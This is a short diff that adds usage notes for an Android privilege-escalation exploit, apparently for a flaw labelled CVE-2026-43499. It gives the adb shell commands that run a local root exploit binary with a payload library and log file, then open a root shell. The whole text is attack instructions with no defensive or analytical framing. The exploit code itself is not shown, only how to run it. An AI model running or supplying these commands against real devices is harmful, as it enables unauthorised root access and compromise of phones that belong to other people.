@@ -1,0 +1,13 @@
+run exploit with:
+adb shell "GHOST_ROOT=1 EXPLOIT_ATTEMPTS=1 \
+  /data/local/tmp/rmg-a16x/cve-2026-43499-root --run-payload \
+  /data/local/tmp/rmg-a16x/app18.so \
+  /data/local/tmp/rmg-a16x/cve-2026-43499-root \
+  /data/local/tmp/rmg-a16x/run2.log" 2>&1
+echo "=== EXIT: $? ==="
+'
+
+
+get root shell:
+adb shell "/data/local/tmp/rmg-a16x/cve-2026-43499-root -c sh"
+
